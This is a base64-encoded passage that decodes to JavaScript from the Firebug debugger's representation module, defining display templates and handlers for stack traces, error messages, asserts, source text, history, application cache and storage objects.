ZnVuY3Rpb24oc3RhY2tGcmFtZSwgY29udGV4dCkNCiAgICB7DQogICAgICAgIHJldHVybiAkU1RSRigiTGluZSIsIFtzdGFja0ZyYW1lLmhyZWYsIHN0YWNrRnJhbWUubGluZU5vXSk7DQogICAgfQ0KDQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCnRoaXMuU3RhY2tUcmFjZSA9IGRvbXBsYXRlKEZpcmVidWcuUmVwLA0Kew0KICAgIHRhZzoNCiAgICAgICAgRk9SKCJmcmFtZSIsICIkb2JqZWN0LmZyYW1lcyBmb2N1c1JvdyIsDQogICAgICAgICAgICBUQUcodGhpcy5TdGFja0ZyYW1lLnRhZywge29iamVjdDogIiRmcmFtZSJ9KQ0KICAgICAgICApLA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgY2xhc3NOYW1lOiAic3RhY2tUcmFjZSIsDQoNCiAgICBzdXBwb3J0c09iamVjdDogZnVuY3Rpb24ob2JqZWN0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIG9iamVjdCBpbnN0YW5jZW9mIFN0YWNrVHJhY2U7DQogICAgfQ0KfSk7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp0aGlzLmpzZFN0YWNrRnJhbWUgPSBkb21wbGF0ZShGaXJlYnVnLlJlcCwNCnsNCiAgICBpbnNwZWN0YWJsZTogZmFsc2UsDQoNCiAgICBzdXBwb3J0c09iamVjdDogZnVuY3Rpb24ob2JqZWN0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIChvYmplY3QgaW5zdGFuY2VvZiBqc2RJU3RhY2tGcmFtZSkgJiYgKG9iamVjdC5pc1ZhbGlkKTsNCiAgICB9LA0KDQogICAgZ2V0VGl0bGU6IGZ1bmN0aW9uKGZyYW1lLCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgaWYgKCFmcmFtZS5pc1ZhbGlkKSByZXR1cm4gIihpbnZhbGlkIGZyYW1lKSI7IC8vIFhYWGpqYiBhdm9pZCBmcmFtZS5zY3JpcHQgPT0gbnVsbA0KICAgICAgICByZXR1cm4gZ2V0RnVuY3Rpb25OYW1lKGZyYW1lLnNjcmlwdCwgY29udGV4dCk7DQogICAgfSwNCg0KICAgIGdldFRvb2x0aXA6IGZ1bmN0aW9uKGZyYW1lLCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgaWYgKCFmcmFtZS5pc1ZhbGlkKSByZXR1cm4gIihpbnZhbGlkIGZyYW1lKSI7ICAvLyBYWFhqamIgYXZvaWQgZnJhbWUuc2NyaXB0ID09IG51bGwNCiAgICAgICAgdmFyIHNvdXJjZUluZm8gPSBGQkwuZ2V0U291cmNlRmlsZUFuZExpbmVCeVNjcmlwdChjb250ZXh0LCBmcmFtZS5zY3JpcHQsIGZyYW1lKTsNCiAgICAgICAgaWYgKHNvdXJjZUluZm8pDQogICAgICAgICAgICByZXR1cm4gJFNUUkYoIkxpbmUiLCBbc291cmNlSW5mby5zb3VyY2VGaWxlLmhyZWYsIHNvdXJjZUluZm8ubGluZU5vXSk7DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHJldHVybiAkU1RSRigiTGluZSIsIFtmcmFtZS5zY3JpcHQuZmlsZU5hbWUsIGZyYW1lLmxpbmVdKTsNCiAgICB9LA0KDQogICAgZ2V0Q29udGV4dE1lbnVJdGVtczogZnVuY3Rpb24oZnJhbWUsIHRhcmdldCwgY29udGV4dCkNCiAgICB7DQogICAgICAgIHZhciBmbiA9IGZyYW1lLnNjcmlwdC5mdW5jdGlvbk9iamVjdC5nZXRXcmFwcGVkVmFsdWUoKTsNCiAgICAgICAgcmV0dXJuIEZpcmVidWdSZXBzLkZ1bmMuZ2V0Q29udGV4dE1lbnVJdGVtcyhmbiwgdGFyZ2V0LCBjb250ZXh0LCBmcmFtZS5zY3JpcHQpOw0KICAgIH0NCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdGhpcy5FcnJvck1lc3NhZ2UgPSBkb21wbGF0ZShGaXJlYnVnLlJlcCwNCnsNCiAgICB0YWc6DQogICAgICAgIE9CSkVDVEJPWCh7DQogICAgICAgICAgICAgICAgJGhhc1R3aXN0eTogIiRvYmplY3R8aGFzU3RhY2tUcmFjZSIsDQogICAgICAgICAgICAgICAgJGhhc0JyZWFrU3dpdGNoOiAiJG9iamVjdHxoYXNCcmVha1N3aXRjaCIsDQogICAgICAgICAgICAgICAgJGJyZWFrRm9yRXJyb3I6ICIkb2JqZWN0fGhhc0Vycm9yQnJlYWsiLA0KICAgICAgICAgICAgICAgIF9yZXBPYmplY3Q6ICIkb2JqZWN0IiwNCiAgICAgICAgICAgICAgICBfc3RhY2tUcmFjZTogIiRvYmplY3R8Z2V0TGFzdEVycm9yU3RhY2tUcmFjZSIsDQogICAgICAgICAgICAgICAgb25jbGljazogIiRvblRvZ2dsZUVycm9yIn0sDQoNCiAgICAgICAgICAgIERJVih7ImNsYXNzIjogImVycm9yVGl0bGUgYTExeUZvY3VzIiwgcm9sZSA6ICdjaGVja2JveCcsICdhcmlhLWNoZWNrZWQnIDogJ2ZhbHNlJ30sDQogICAgICAgICAgICAgICAgIiRvYmplY3QubWVzc2FnZXxnZXRNZXNzYWdlIg0KICAgICAgICAgICAgKSwNCiAgICAgICAgICAgIERJVih7ImNsYXNzIjogImVycm9yVHJhY2UifSksDQogICAgICAgICAgICBESVYoeyJjbGFzcyI6ICJlcnJvclNvdXJjZUJveCBlcnJvclNvdXJjZS0kb2JqZWN0fGdldFNvdXJjZVR5cGUifSwNCiAgICAgICAgICAgICAgICBJTUcoeyJjbGFzcyI6ICJlcnJvckJyZWFrIGExMXlGb2N1cyIsIHNyYzoiYmxhbmsuZ2lmIiwgcm9sZSA6ICdjaGVja2JveCcsICdhcmlhLWNoZWNrZWQnOidmYWxzZScsIHRpdGxlOiAiQnJlYWsgb24gdGhpcyBlcnJvciJ9KSwNCiAgICAgICAgICAgICAgICBBKHsiY2xhc3MiOiAiZXJyb3JTb3VyY2UgYTExeUZvY3VzIn0sICIkb2JqZWN0fGdldExpbmUiKQ0KICAgICAgICAgICAgKSwNCiAgICAgICAgICAgIFRBRyh0aGlzLlNvdXJjZUxpbmsudGFnLCB7b2JqZWN0OiAiJG9iamVjdHxnZXRTb3VyY2VMaW5rIn0pDQogICAgICAgICksDQoNCiAgICBnZXRMYXN0RXJyb3JTdGFja1RyYWNlOiBmdW5jdGlvbihlcnJvcikNCiAgICB7DQogICAgICAgIHJldHVybiBlcnJvci50cmFjZTsNCiAgICB9LA0KDQogICAgaGFzU3RhY2tUcmFjZTogZnVuY3Rpb24oZXJyb3IpDQogICAgew0KICAgICAgICB2YXIgdXJsID0gZXJyb3IuaHJlZi50b1N0cmluZygpOw0KICAgICAgICB2YXIgZnJvbUNvbW1hbmRMaW5lID0gKHVybC5pbmRleE9mKCJYUENTYWZlSlNPYmplY3RXcmFwcGVyIikgIT0gLTEpOw0KICAgICAgICByZXR1cm4gIWZyb21Db21tYW5kTGluZSAmJiBlcnJvci50cmFjZTsNCiAgICB9LA0KDQogICAgaGFzQnJlYWtTd2l0Y2g6IGZ1bmN0aW9uKGVycm9yKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIGVycm9yLmhyZWYgJiYgZXJyb3IubGluZU5vID4gMDsNCiAgICB9LA0KDQogICAgaGFzRXJyb3JCcmVhazogZnVuY3Rpb24oZXJyb3IpDQogICAgew0KICAgICAgICByZXR1cm4gZmJzLmhhc0Vycm9yQnJlYWtwb2ludChlcnJvci5ocmVmLCBlcnJvci5saW5lTm8pOw0KICAgIH0sDQoNCiAgICBnZXRNZXNzYWdlOiBmdW5jdGlvbihtZXNzYWdlKQ0KICAgIHsNCiAgICAgICAgdmFyIHJlID0gL1xbRXhjZXB0aW9uLi4uICIoLio/KSIgbnNyZXN1bHQ6LzsNCiAgICAgICAgdmFyIG0gPSByZS5leGVjKG1lc3NhZ2UpOw0KICAgICAgICByZXR1cm4gbSA/IG1bMV0gOiBtZXNzYWdlOw0KICAgIH0sDQoNCiAgICBnZXRMaW5lOiBmdW5jdGlvbihlcnJvcikNCiAgICB7DQogICAgICAgIGlmIChlcnJvci5jYXRlZ29yeSA9PSAianMiKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoZXJyb3Iuc291cmNlKQ0KICAgICAgICAgICAgICAgIHJldHVybiBjcm9wU3RyaW5nKGVycm9yLnNvdXJjZSwgODApOw0KICAgICAgICAgICAgZWxzZSBpZiAoZXJyb3IuaHJlZiAmJiBlcnJvci5ocmVmLmluZGV4T2YoIlhQQ1NhZmVKU09iamVjdFdyYXBwZXIiKSA9PSAtMSkNCiAgICAgICAgICAgICAgICByZXR1cm4gY3JvcFN0cmluZyhlcnJvci5nZXRTb3VyY2VMaW5lKCksIDgwKTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBnZXRTb3VyY2VMaW5rOiBmdW5jdGlvbihlcnJvcikNCiAgICB7DQogICAgICAgIHZhciBleHQgPSBlcnJvci5jYXRlZ29yeSA9PSAiY3NzIiA/ICJjc3MiIDogImpzIjsNCiAgICAgICAgcmV0dXJuIGVycm9yLmxpbmVObyA/IG5ldyBTb3VyY2VMaW5rKGVycm9yLmhyZWYsIGVycm9yLmxpbmVObywgZXh0KSA6IG51bGw7DQogICAgfSwNCg0KICAgIGdldFNvdXJjZVR5cGU6IGZ1bmN0aW9uKGVycm9yKQ0KICAgIHsNCiAgICAgICAgLy8gRXJyb3JzIG9jY3VycmluZyBpbnNpZGUgb2YgSFRNTCBldmVudCBoYW5kbGVycyBsb29rIGxpa2UgImZvby5odG1sIChsaW5lIDEpIg0KICAgICAgICAvLyBzbyBsZXQncyB0cnkgdG8gc2tpcCB0aG9zZQ0KICAgICAgICBpZiAoZXJyb3Iuc291cmNlKQ0KICAgICAgICAgICAgcmV0dXJuICJzeW50YXgiOw0KICAgICAgICBlbHNlIGlmIChlcnJvci5saW5lTm8gPT0gMSAmJiBnZXRGaWxlRXh0ZW5zaW9uKGVycm9yLmhyZWYpICE9ICJqcyIpDQogICAgICAgICAgICByZXR1cm4gIm5vbmUiOw0KICAgICAgICBlbHNlIGlmIChlcnJvci5jYXRlZ29yeSA9PSAiY3NzIikNCiAgICAgICAgICAgIHJldHVybiAibm9uZSI7DQogICAgICAgIGVsc2UgaWYgKCFlcnJvci5ocmVmIHx8ICFlcnJvci5saW5lTm8pDQogICAgICAgICAgICByZXR1cm4gIm5vbmUiOw0KICAgICAgICBlbHNlDQogICAgICAgICAgICByZXR1cm4gImV4ZWMiOw0KICAgIH0sDQoNCiAgICBvblRvZ2dsZUVycm9yOiBmdW5jdGlvbihldmVudCkNCiAgICB7DQogICAgICAgIHZhciB0YXJnZXQgPSBldmVudC5jdXJyZW50VGFyZ2V0Ow0KICAgICAgICBpZiAoaGFzQ2xhc3MoZXZlbnQudGFyZ2V0LCAiZXJyb3JCcmVhayIpKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLmJyZWFrT25UaGlzRXJyb3IodGFyZ2V0LnJlcE9iamVjdCk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSBpZiAoaGFzQ2xhc3MoZXZlbnQudGFyZ2V0LCAiZXJyb3JTb3VyY2UiKSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHBhbmVsID0gRmlyZWJ1Zy5nZXRFbGVtZW50UGFuZWwoZXZlbnQudGFyZ2V0KTsNCiAgICAgICAgICAgIHRoaXMuaW5zcGVjdE9iamVjdCh0YXJnZXQucmVwT2JqZWN0LCBwYW5lbC5jb250ZXh0KTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIGlmIChoYXNDbGFzcyhldmVudC50YXJnZXQsICJlcnJvclRpdGxlIikpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciB0cmFjZUJveCA9IHRhcmdldC5jaGlsZE5vZGVzWzFdOw0KICAgICAgICAgICAgdG9nZ2xlQ2xhc3ModGFyZ2V0LCAib3BlbmVkIik7DQogICAgICAgICAgICBldmVudC50YXJnZXQuc2V0QXR0cmlidXRlKCdhcmlhLWNoZWNrZWQnLCBoYXNDbGFzcyh0YXJnZXQsICJvcGVuZWQiKSk7DQogICAgICAgICAgICBpZiAoaGFzQ2xhc3ModGFyZ2V0LCAib3BlbmVkIikpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKHRhcmdldC5zdGFja1RyYWNlKQ0KICAgICAgICAgICAgICAgICAgICB2YXIgbm9kZSA9IEZpcmVidWdSZXBzLlN0YWNrVHJhY2UudGFnLmFwcGVuZCh7b2JqZWN0OiB0YXJnZXQuc3RhY2tUcmFjZX0sIHRyYWNlQm94KTsNCiAgICAgICAgICAgICAgICBpZiAoRmlyZWJ1Zy5BMTF5TW9kZWwuZW5hYmxlZCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhciBwYW5lbCA9IEZpcmVidWcuZ2V0RWxlbWVudFBhbmVsKGV2ZW50LnRhcmdldCk7DQogICAgICAgICAgICAgICAgICAgIGRpc3BhdGNoKFtGaXJlYnVnLkExMXlNb2RlbF0sICJvbkxvZ1Jvd0NvbnRlbnRDcmVhdGVkIiwgW3BhbmVsICwgdHJhY2VCb3hdKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgY2xlYXJOb2RlKHRyYWNlQm94KTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBjb3B5RXJyb3I6IGZ1bmN0aW9uKGVycm9yKQ0KICAgIHsNCiAgICAgICAgdmFyIG1lc3NhZ2UgPSBbDQogICAgICAgICAgICB0aGlzLmdldE1lc3NhZ2UoZXJyb3IubWVzc2FnZSksDQogICAgICAgICAgICBlcnJvci5ocmVmLA0KICAgICAgICAgICAgIkxpbmUgIiArICBlcnJvci5saW5lTm8NCiAgICAgICAgXTsNCiAgICAgICAgY29weVRvQ2xpcGJvYXJkKG1lc3NhZ2Uuam9pbigiXG4iKSk7DQogICAgfSwNCg0KICAgIGJyZWFrT25UaGlzRXJyb3I6IGZ1bmN0aW9uKGVycm9yKQ0KICAgIHsNCiAgICAgICAgaWYgKHRoaXMuaGFzRXJyb3JCcmVhayhlcnJvcikpDQogICAgICAgICAgICBGaXJlYnVnLkRlYnVnZ2VyLmNsZWFyRXJyb3JCcmVha3BvaW50KGVycm9yLmhyZWYsIGVycm9yLmxpbmVObyk7DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIEZpcmVidWcuRGVidWdnZXIuc2V0RXJyb3JCcmVha3BvaW50KGVycm9yLmhyZWYsIGVycm9yLmxpbmVObyk7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGNsYXNzTmFtZTogImVycm9yTWVzc2FnZSIsDQogICAgaW5zcGVjdGFibGU6IGZhbHNlLA0KDQogICAgc3VwcG9ydHNPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCkNCiAgICB7DQogICAgICAgIHJldHVybiBvYmplY3QgaW5zdGFuY2VvZiBFcnJvck1lc3NhZ2U7DQogICAgfSwNCg0KICAgIGluc3BlY3RPYmplY3Q6IGZ1bmN0aW9uKGVycm9yLCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgdmFyIHNvdXJjZUxpbmsgPSB0aGlzLmdldFNvdXJjZUxpbmsoZXJyb3IpOw0KICAgICAgICBGaXJlYnVnUmVwcy5Tb3VyY2VMaW5rLmluc3BlY3RPYmplY3Qoc291cmNlTGluaywgY29udGV4dCk7DQogICAgfSwNCg0KICAgIGdldENvbnRleHRNZW51SXRlbXM6IGZ1bmN0aW9uKGVycm9yLCB0YXJnZXQsIGNvbnRleHQpDQogICAgew0KICAgICAgICB2YXIgYnJlYWtPblRoaXNFcnJvciA9IHRoaXMuaGFzRXJyb3JCcmVhayhlcnJvcik7DQoNCiAgICAgICAgdmFyIGl0ZW1zID0gWw0KICAgICAgICAgICAge2xhYmVsOiAiQ29weUVycm9yIiwgY29tbWFuZDogYmluZEZpeGVkKHRoaXMuY29weUVycm9yLCB0aGlzLCBlcnJvcikgfQ0KICAgICAgICBdOw0KDQogICAgICAgIGlmIChlcnJvci5jYXRlZ29yeSA9PSAiY3NzIikNCiAgICAgICAgew0KICAgICAgICAgICAgaXRlbXMucHVzaCgNCiAgICAgICAgICAgICAgICAiLSIsDQogICAgICAgICAgICAgICAge2xhYmVsOiAiQnJlYWtPblRoaXNFcnJvciIsIHR5cGU6ICJjaGVja2JveCIsIGNoZWNrZWQ6IGJyZWFrT25UaGlzRXJyb3IsDQogICAgICAgICAgICAgICAgIGNvbW1hbmQ6IGJpbmRGaXhlZCh0aGlzLmJyZWFrT25UaGlzRXJyb3IsIHRoaXMsIGVycm9yKSB9LA0KDQogICAgICAgICAgICAgICAgb3B0aW9uTWVudSgiQnJlYWtPbkFsbEVycm9ycyIsICJicmVha09uRXJyb3JzIikNCiAgICAgICAgICAgICk7DQogICAgICAgIH0NCg0KICAgICAgICByZXR1cm4gaXRlbXM7DQogICAgfQ0KfSk7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp0aGlzLkFzc2VydCA9IGRvbXBsYXRlKEZpcmVidWcuUmVwLA0Kew0KICAgIHRhZzoNCiAgICAgICAgRElWKA0KICAgICAgICAgICAgRElWKHsiY2xhc3MiOiAiZXJyb3JUaXRsZSJ9KSwNCiAgICAgICAgICAgIERJVih7ImNsYXNzIjogImFzc2VydERlc2NyaXB0aW9uIn0pDQogICAgICAgICksDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBjbGFzc05hbWU6ICJhc3NlcnQiLA0KDQogICAgaW5zcGVjdE9iamVjdDogZnVuY3Rpb24oZXJyb3IsIGNvbnRleHQpDQogICAgew0KICAgICAgICB2YXIgc291cmNlTGluayA9IHRoaXMuZ2V0U291cmNlTGluayhlcnJvcik7DQogICAgICAgIEZpcmVidWcuY2hyb21lLnNlbGVjdChzb3VyY2VMaW5rKTsNCiAgICB9LA0KDQogICAgZ2V0Q29udGV4dE1lbnVJdGVtczogZnVuY3Rpb24oZXJyb3IsIHRhcmdldCwgY29udGV4dCkNCiAgICB7DQogICAgICAgIHZhciBicmVha09uVGhpc0Vycm9yID0gdGhpcy5oYXNFcnJvckJyZWFrKGVycm9yKTsNCg0KICAgICAgICByZXR1cm4gWw0KICAgICAgICAgICAge2xhYmVsOiAiQ29weUVycm9yIiwgY29tbWFuZDogYmluZEZpeGVkKHRoaXMuY29weUVycm9yLCB0aGlzLCBlcnJvcikgfSwNCiAgICAgICAgICAgICItIiwNCiAgICAgICAgICAgIHtsYWJlbDogIkJyZWFrT25UaGlzRXJyb3IiLCB0eXBlOiAiY2hlY2tib3giLCBjaGVja2VkOiBicmVha09uVGhpc0Vycm9yLA0KICAgICAgICAgICAgIGNvbW1hbmQ6IGJpbmRGaXhlZCh0aGlzLmJyZWFrT25UaGlzRXJyb3IsIHRoaXMsIGVycm9yKSB9LA0KICAgICAgICAgICAge2xhYmVsOiAiQnJlYWtPbkFsbEVycm9ycyIsIHR5cGU6ICJjaGVja2JveCIsIGNoZWNrZWQ6IEZpcmVidWcuYnJlYWtPbkVycm9ycywNCiAgICAgICAgICAgICBjb21tYW5kOiBiaW5kRml4ZWQodGhpcy5icmVha09uQWxsRXJyb3JzLCB0aGlzLCBlcnJvcikgfQ0KICAgICAgICBdOw0KICAgIH0NCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdGhpcy5Tb3VyY2VUZXh0ID0gZG9tcGxhdGUoRmlyZWJ1Zy5SZXAsDQp7DQogICAgdGFnOg0KICAgICAgICBESVYoDQogICAgICAgICAgICBGT1IoImxpbmUiLCAiJG9iamVjdHxsaW5lSXRlcmF0b3IiLA0KICAgICAgICAgICAgICAgIERJVih7ImNsYXNzIjogInNvdXJjZVJvdyIsIHJvbGUgOiAicHJlc2VudGF0aW9uIn0sDQogICAgICAgICAgICAgICAgICAgIFNQQU4oeyJjbGFzcyI6ICJzb3VyY2VMaW5lIiwgcm9sZSA6ICJwcmVzZW50YXRpb24ifSwgIiRsaW5lLmxpbmVObyIpLA0KICAgICAgICAgICAgICAgICAgICBTUEFOKHsiY2xhc3MiOiAic291cmNlUm93VGV4dCIsIHJvbGUgOiAicHJlc2VudGF0aW9uIn0sICIkbGluZS50ZXh0IikNCiAgICAgICAgICAgICAgICApDQogICAgICAgICAgICApDQogICAgICAgICksDQoNCiAgICBsaW5lSXRlcmF0b3I6IGZ1bmN0aW9uKHNvdXJjZVRleHQpDQogICAgew0KICAgICAgICB2YXIgbWF4TGluZU5vQ2hhcnMgPSAoc291cmNlVGV4dC5saW5lcy5sZW5ndGggKyAiIikubGVuZ3RoOw0KICAgICAgICB2YXIgbGlzdCA9IFtdOw0KDQogICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgc291cmNlVGV4dC5saW5lcy5sZW5ndGg7ICsraSkNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gTWFrZSBzdXJlIGFsbCBsaW5lIG51bWJlcnMgYXJlIHRoZSBzYW1lIHdpZHRoICh3aXRoIGEgZml4ZWQtd2lkdGggZm9udCkNCiAgICAgICAgICAgIHZhciBsaW5lTm8gPSAoaSsxKSArICIiOw0KICAgICAgICAgICAgd2hpbGUgKGxpbmVOby5sZW5ndGggPCBtYXhMaW5lTm9DaGFycykNCiAgICAgICAgICAgICAgICBsaW5lTm8gPSAiICIgKyBsaW5lTm87DQoNCiAgICAgICAgICAgIGxpc3QucHVzaCh7bGluZU5vOiBsaW5lTm8sIHRleHQ6IHNvdXJjZVRleHQubGluZXNbaV19KTsNCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiBsaXN0Ow0KICAgIH0sDQoNCiAgICBnZXRIVE1MOiBmdW5jdGlvbihzb3VyY2VUZXh0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIGdldFNvdXJjZUxpbmVSYW5nZShzb3VyY2VUZXh0LCAxLCBzb3VyY2VUZXh0LmxpbmVzLmxlbmd0aCk7DQogICAgfQ0KfSk7DQoNCi8vKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQp0aGlzLm5zSURPTUhpc3RvcnkgPSBkb21wbGF0ZShGaXJlYnVnLlJlcCwNCnsNCiAgICB0YWc6T0JKRUNUQk9YKHtvbmNsaWNrOiAiJHNob3dIaXN0b3J5In0sDQogICAgICAgICAgICBPQkpFQ1RMSU5LKCIkb2JqZWN0fHN1bW1hcml6ZUhpc3RvcnkiKQ0KICAgICAgICApLA0KDQogICAgY2xhc3NOYW1lOiAibnNJRE9NSGlzdG9yeSIsDQoNCiAgICBzdW1tYXJpemVIaXN0b3J5OiBmdW5jdGlvbihoaXN0b3J5KQ0KICAgIHsNCiAgICAgICAgdHJ5DQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBpdGVtcyA9IGhpc3RvcnkubGVuZ3RoOw0KICAgICAgICAgICAgcmV0dXJuIGl0ZW1zICsgIiBoaXN0b3J5IGVudHJpZXMiOw0KICAgICAgICB9DQogICAgICAgIGNhdGNoKGV4YykNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuICJvYmplY3QgZG9lcyBub3Qgc3VwcG9ydCBoaXN0b3J5IChuc0lET01IaXN0b3J5KSI7DQogICAgICAgIH0NCiAgICB9LA0KDQogICAgc2hvd0hpc3Rvcnk6IGZ1bmN0aW9uKGhpc3RvcnkpDQogICAgew0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIGl0ZW1zID0gaGlzdG9yeS5sZW5ndGg7ICAvLyBpZiB0aGlzIHRocm93cywgdGhlbiB1bnN1cHBvcnRlZA0KICAgICAgICAgICAgRmlyZWJ1Zy5jaHJvbWUuc2VsZWN0KGhpc3RvcnkpOw0KICAgICAgICB9DQogICAgICAgIGNhdGNoIChleGMpDQogICAgICAgIHsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBzdXBwb3J0c09iamVjdDogZnVuY3Rpb24ob2JqZWN0LCB0eXBlKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIChvYmplY3QgaW5zdGFuY2VvZiBDaS5uc0lET01IaXN0b3J5KTsNCiAgICB9DQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQp0aGlzLkFwcGxpY2F0aW9uQ2FjaGUgPSBkb21wbGF0ZShGaXJlYnVnLlJlcCwNCnsNCiAgICB0YWc6T0JKRUNUQk9YKHtvbmNsaWNrOiAiJHNob3dBcHBsaWNhdGlvbkNhY2hlIn0sDQogICAgICAgICAgICBPQkpFQ1RMSU5LKCIkb2JqZWN0fHN1bW1hcml6ZUNhY2hlIikNCiAgICAgICAgKSwNCg0KICAgIHN1bW1hcml6ZUNhY2hlOiBmdW5jdGlvbihhcHBsaWNhdGlvbkNhY2hlKQ0KICAgIHsNCiAgICAgICAgdHJ5DQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiBhcHBsaWNhdGlvbkNhY2hlLmxlbmd0aCArICIgaXRlbXMgaW4gb2ZmbGluZSBjYWNoZSI7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2goZXhjKQ0KICAgICAgICB7DQogICAgICAgICAgICByZXR1cm4gImh0dHBzOi8vYnVnemlsbGEubW96aWxsYS5vcmcvc2hvd19idWcuY2dpP2lkPTQyMjI2NCI7DQogICAgICAgIH0NCiAgICB9LA0KDQogICAgc2hvd0FwcGxpY2F0aW9uQ2FjaGU6IGZ1bmN0aW9uKGV2ZW50KQ0KICAgIHsNCiAgICAgICAgb3Blbk5ld1RhYigiaHR0cHM6Ly9idWd6aWxsYS5tb3ppbGxhLm9yZy9zaG93X2J1Zy5jZ2k/aWQ9NDIyMjY0Iik7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGNsYXNzTmFtZTogImFwcGxpY2F0aW9uQ2FjaGUiLA0KDQogICAgc3VwcG9ydHNPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCwgdHlwZSkNCiAgICB7DQogICAgICAgIGlmIChDaS5uc0lET01PZmZsaW5lUmVzb3VyY2VMaXN0KQ0KICAgICAgICAgICAgcmV0dXJuIChvYmplY3QgaW5zdGFuY2VvZiBDaS5uc0lET01PZmZsaW5lUmVzb3VyY2VMaXN0KTsNCiAgICB9DQoNCn0pOw0KDQp0aGlzLlN0b3JhZ2UgPSBkb21wbGF0ZShGaXJlYnVnLlJlcCwNCnsNCiAgICB0YWc6IE9CSkVDVEJPWCh7b25jbGljazogIiRzaG93In0sIE9CSkVDVExJTksoIiRvYmplY3R8c3VtbWFyaXplIikpLA0KDQogICAgc3VtbWFyaXplOiBmdW5jdGlvbihzdG9yYWdlKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIHN0b3JhZ2UubGVuZ3RoICsiIGl0ZW1zIGluIFN0b3JhZ2UiOw0KICAgIH0sDQogICAgc2hvdzogZnVuY3Rpb24oc3RvcmFnZSkNCiAgICB7DQogICAgICAgIG9wZW5OZXdUYWIoImh0dHA6Ly9kZXYudzMub3JnL2h0bWw1L3dlYnN0b3JhZ2UvI3N0b3JhZ2UtMCIpOw0KICAgIH0sDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgY2xhc3NOYW1lOiAiU3RvcmFnZSIsDQoNCiAgICBzdXBwb3J0c09iamVjdDogZnVuY3Rp